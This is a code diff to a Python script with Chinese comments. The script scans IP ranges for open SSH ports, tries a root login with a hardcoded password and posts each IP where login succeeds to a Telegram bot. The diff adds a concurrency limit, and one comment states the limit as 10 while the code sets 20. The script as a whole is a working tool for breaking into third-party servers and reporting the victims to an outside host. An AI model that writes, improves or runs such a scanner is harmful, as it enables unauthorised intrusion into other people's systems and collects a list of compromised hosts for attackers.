@@ -16,31 +16,33 @@ def ip_list_in_range(start_ip, end_ip):
                     yield f"{i}.{j}.{k}.{l}"
 
 # 检测IP的22端口是否开放（异步）
-async def check_port(ip):
+async def check_port(ip, semaphore):
     port = 22
     timeout = 3
-    try:
-        reader, writer = await asyncio.open_connection(ip, port)
-        writer.close()
-        await writer.wait_closed()
-        return True
-    except (asyncio.TimeoutError, ConnectionRefusedError):
-        return False
+    async with semaphore:  # 控制并发量
+        try:
+            reader, writer = await asyncio.open_connection(ip, port)
+            writer.close()
+            await writer.wait_closed()
+            return True
+        except (asyncio.TimeoutError, ConnectionRefusedError):
+            return False
 
 # 使用SSH进行登录尝试（异步）
-async def try_ssh_login(ip):
+async def try_ssh_login(ip, semaphore):
     username = 'root'
     password = 'NP1215GP55*3*AACAAC'
-    try:
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(ip, port=22, username=username, password=password, timeout=5)
-        ssh.close()
-        return True
-    except (paramiko.AuthenticationException, paramiko.SSHException):
-        return False
-    except Exception as e:
-        return False
+    async with semaphore:  # 控制并发量
+        try:
+            ssh = paramiko.SSHClient()
+            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            ssh.connect(ip, port=22, username=username, password=password, timeout=5)
+            ssh.close()
+            return True
+        except (paramiko.AuthenticationException, paramiko.SSHException):
+            return False
+        except Exception as e:
+            return False
 
 # 发信息给TG机器人（异步）
 async def send_message_to_telegram(message, session):
@@ -60,11 +62,11 @@ async def send_message_to_telegram(message, session):
         print(f"Error while sending message: {e}")
 
 # 执行扫描任务的协程
-async def scan_ip(ip, session):
+async def scan_ip(ip, session, semaphore):
     # 1. 检查22端口是否开放
-    if await check_port(ip):
+    if await check_port(ip, semaphore):
         # 2. 如果端口开放，尝试SSH登录
-        if await try_ssh_login(ip):
+        if await try_ssh_login(ip, semaphore):
             print(f"成功登录到 {ip}")
             await send_message_to_telegram(ip, session)
         else:
@@ -82,12 +84,14 @@ async def main():
     
     # 使用aiohttp来管理HTTP请求
     async with ClientSession() as session:
+        semaphore = asyncio.Semaphore(20)  # 设置并发请求数为10，可以根据需要调整
+        
         tasks = []
         for start_ip, end_ip in ip_ranges:
             # 为每个IP生成扫描任务并添加到任务列表中
             ip_generator = ip_list_in_range(start_ip, end_ip)
             for ip in ip_generator:
-                task = scan_ip(ip, session)
+                task = scan_ip(ip, session, semaphore)
                 tasks.append(task)
 
         # 并发执行所有任务
